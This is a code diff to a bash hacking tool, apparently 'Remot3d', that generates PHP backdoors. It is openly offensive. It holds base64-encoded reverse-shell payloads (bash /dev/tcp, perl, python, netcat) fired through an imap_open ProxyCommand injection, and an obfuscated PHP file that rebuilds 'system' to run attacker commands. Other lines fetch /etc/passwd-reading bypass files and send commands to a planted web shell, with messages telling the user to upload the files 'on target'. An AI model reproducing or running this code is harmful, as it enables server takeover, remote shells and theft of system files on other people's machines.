@@ -62,8 +62,6 @@ main_remot3d_1 () {
     echo "";
 
 }
-
-
 main_remot3d_2 () {
     clear
     banner
@@ -79,9 +77,9 @@ main_remot3d_2 () {
     read lang_rev
     cat << EOF > $out_name 
 <?php
-$config["ip"] = "$L_HOST";
-$config["port"] = "$L_PORT";
-$config["payload"] = [
+\$config["ip"] = "$L_HOST";
+\$config["port"] = "$L_PORT";
+\$config["payload"] = [
 	"bash" => "YmFzaCAtaSA+JiAvZGV2L3RjcC9bSVBdL1tQT1JUXSAwPiYx",
 	"perl" => "cGVybCAtZSAndXNlIFNvY2tldDskaT0iW0lQXSI7JHA9W1BPUlRdO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=",
 	"python" => "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiW0lQXSIsW1BPUlRdKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn",
@@ -90,11 +88,11 @@ $config["payload"] = [
 	"netcat" => "bmMgLWUgL2Jpbi9zaCBbSVBdIFtQT1JUXQ==",
 	"nc" => "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgW0lQXSBbUE9SVF0gPi90bXAvZg==",
 ];
-$lang = "$lang_rev"; // PROGRAMMING LANGUAGE
-$payload = str_replace([ "[IP]", "[PORT]" ], [ $config["ip"], $config["port"] ], base64_decode($config["payload"][$lang]));
-echo "[{$lang}] => {$payload} ";
-$server = "any -o ProxyCommand=echo\t".base64_encode($payload)."|base64\t-d|bash";
-@imap_open('{'.$server.'}:143/imap}INBOX', '', '');
+\$lang = "$lang_rev"; // PROGRAMMING LANGUAGE
+\$payload = str_replace([ "[IP]", "[PORT]" ], [ \$config["ip"], \$config["port"] ], base64_decode(\$config["payload"][\$lang]));
+echo "[{\$lang}] => {\$payload} ";
+\$server = "any -o ProxyCommand=echo\t".base64_encode(\$payload)."|base64\t-d|bash";
+@imap_open('{'.\$server.'}:143/imap}INBOX', '', '');
 ?>
 EOF
     printf "      ${white}[${green}+${white}] Success Generating Backdoor on ${green}$pwd/$out_name\n"
@@ -118,7 +116,7 @@ read optionz
     printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
     read etcpass_byp_file
     ## Bypass /etc/passwd - BY : ARDZZ
-   dwnld_etcpass_byp1=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/readfile-uniq.php -O $etcpass_byp_file)
+   dwnld_etcpass_byp1=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/readfile-uniq.php -o $etcpass_byp_file)
    echo ""
     printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
         printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$etcpass_byp_file \n"
@@ -128,7 +126,7 @@ banner
 printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
     read etcpass_byp_curl
     ## Bypass /etc/passwd - BY : ARDZZ
-   dwnld_etcpass_byp2=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/readfile-curl.php -O $etcpass_byp_curl)
+   dwnld_etcpass_byp2=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/readfile-curl.php -o $etcpass_byp_curl)
    echo ""
     printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
         printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$etcpass_byp_curl \n"
@@ -141,24 +139,25 @@ printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
         fi
 }
         option_about_etcpasswd () {
-      printf "      ${white}[${green}+${white}] Set Your Own Command (default is ${green}$u/b??/c?t $u/??c$u/p????d (for bypass /etc/passwd/)) (Y/n) ? : "
+      printf "      ${white}[${green}+${white}] Set Your Own Command (default is ${green}$u/b??/c?t $u/??c$u/p????d${white}) (Y/n) ? : "
       read system_default
             printf "      ${white}[${green}+${white}] Set Your File Name : "
             read sys_name
-      if [[ $system_default == "Y" ]]; then
+      if [[ $system_default == "Y" ]] || [[ $system_default == "y" ]]; then
 printf "      ${white}[${green}+${white}] Set Command : "
 read sys_cmd
 cat << SYS > $sys_name
 <?php
-$a=("m".("s".("e")."t")."y");$b=$a[90/10-8]./**/($a[2*2-0/1]).$a[1*0+1/
-1-0]./**/$a[150/50].($a[6/3*1/**/-0]).$a[/**/!FAlsE+fALsE-!fAlSe];$b('$sys_cmd');
+\$a=("m".("s".("e")."t")."y");\$b=$a[90/10-8]./**/(\$a[2*2-0/1]).\$a[1*0+1/
+1-0]./**/\$a[150/50].($a[6/3*1/**/-0]).\$a[/**/!FAlsE+fALsE-!fAlSe];\$b('$sys_cmd');
 ?>
 SYS
+sleep 2
    echo ""
     printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
         printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$sys_name \n"
-elif [[ $system_default == "n" ]]; then
-grab_sys_file=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/command_system_bypass -o $sys_name)
+elif [[ $system_default == "n" ]] | [[ $system_default == "N" ]]; then
+grab_sys_file=$(timeout 2 curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/command_system_bypass.php -o $sys_name)
    echo ""
     printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
         printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$sys_name \n"
@@ -172,7 +171,7 @@ main_remot3d_4 () {
     echo "";
     printf "      ${white}[${green}+${white}] Shell Location's : "
     read shell_loc
-    # check shell alive or not
+    # check shell alive or not and connecting to backdoor
     response=$(timeout 3 curl --write-out "%{http_code}\n" --silent --output /dev/null "$shell_loc")
     if [[ $response =~ "200" ]]; then
         spinlong
@@ -184,8 +183,8 @@ main_remot3d_4 () {
     echo ""
     printf "      ${white}[${green}+${white}] COMMAND : "
     read cmd
-    reverse=$(curl --silent -d idx="$cmd" "$shell_loc")
-    printf "       └${white}[${blue}>${white}] $reverse\n"
+    reverse=$(curl --silent -d idx="$cmd" $shell_loc)
+    printf "       └${white}[${blue}>${white}] $reverse\n" done
 done
     else
         spinlong
